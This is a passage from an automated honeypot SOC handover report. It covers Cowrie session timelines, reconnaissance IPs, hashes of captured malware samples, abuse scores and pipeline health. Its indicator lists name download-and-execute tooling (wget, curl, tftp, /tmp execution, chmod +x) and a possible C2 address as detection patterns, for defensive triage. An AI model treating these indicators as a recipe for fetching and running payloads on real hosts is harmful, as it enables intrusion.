| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:54:40` | `cowrie.session.connect` |
| `2026-07-26 04:54:41` | `cowrie.login.success` |
| `2026-07-26 04:54:42` | `cowrie.session.params` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:42` | `cowrie.command.input` |
| `2026-07-26 04:54:42` | `cowrie.command.failed` |
| `2026-07-26 04:54:53` | `cowrie.log.closed` |
| `2026-07-26 04:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24e0f5fec2bc

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-26 04:54 |
| **Last Seen** | 2026-07-26 04:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 512, Connection: close, User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:54:54` | `cowrie.session.connect` |
| `2026-07-26 04:54:54` | `cowrie.login.success` |
| `2026-07-26 04:54:54` | `cowrie.session.params` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |
| `2026-07-26 04:54:54` | `cowrie.command.input` |
| `2026-07-26 04:54:54` | `cowrie.command.failed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.140.165[.]23` | **30** | 2026-07-26 03:37 | 2026-07-26 03:37 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `34.38.205[.]96` | **30** | 2026-07-26 03:01 | 2026-07-26 03:01 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **9** | 2026-07-26 02:55 | 2026-07-26 04:49 | 10m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **6** | 2026-07-26 03:22 | 2026-07-26 04:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-26 03:05 | 2026-07-26 04:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | **5** | 2026-07-26 03:56 | 2026-07-26 03:59 | 3m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **3** | 2026-07-26 02:59 | 2026-07-26 03:44 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-26 03:45 | 2026-07-26 03:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.14.209[.]20` | 1 | 2026-07-26 03:52 | 2026-07-26 03:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.112.194[.]160` | 1 | 2026-07-26 03:49 | 2026-07-26 03:49 | 23s | 0 | `T1592` | 🟢 LOW |
| `113.108.13[.]168` | 1 | 2026-07-26 03:46 | 2026-07-26 03:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.255[.]67` | 1 | 2026-07-26 03:54 | 2026-07-26 03:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `160.119.71[.]92` | 1 | 2026-07-26 04:54 | 2026-07-26 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]123` | 1 | 2026-07-26 03:08 | 2026-07-26 03:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]142` | 1 | 2026-07-26 04:13 | 2026-07-26 04:13 | 2s | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]89` | 1 | 2026-07-26 03:56 | 2026-07-26 03:56 | 15s | 0 | `T1592` | 🟢 LOW |
| `2.55.69[.]224` | 1 | 2026-07-26 04:19 | 2026-07-26 04:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-26 04:06 | 2026-07-26 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]19` | 1 | 2026-07-26 03:49 | 2026-07-26 03:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]21` | 1 | 2026-07-26 04:50 | 2026-07-26 04:51 | 4s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]254` | 1 | 2026-07-26 04:43 | 2026-07-26 04:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]92` | 1 | 2026-07-26 03:00 | 2026-07-26 03:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `96.57.237[.]30` | 1 | 2026-07-26 03:45 | 2026-07-26 03:45 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `75.80.65[.]214` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `195.96.139[.]142` | GB | Driftnet Ltd | **100** ⚠️ | 7 |
| `117.205.3[.]26` | IN | NIB (National Internet Backbone) | **100** ⚠️ | 25 |
| `196.189.124[.]229` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `49.124.153[.]19` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 48 |
| `213.101.138[.]172` | LT | Tele2 Lithuania | **100** ⚠️ | 50 |
| `135.149.57[.]58` | JP | Microsoft Singapore Pte. Ltd. | **100** ⚠️ | 7 |
| `200.159.14[.]187` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `2.55.69[.]224` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `223.25.108[.]2` | ID | PT Sinergi Semesta Telematika | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 122 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 117 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 65 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 63 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 63 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 236 cases |
| Tool 34  | Credential Extractor        | ✅ 140 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (5.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 117 priority case(s) shown individually · 23 recon entry/entries in table (8 group(s) consolidating 91 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-26T06:41:31Z_
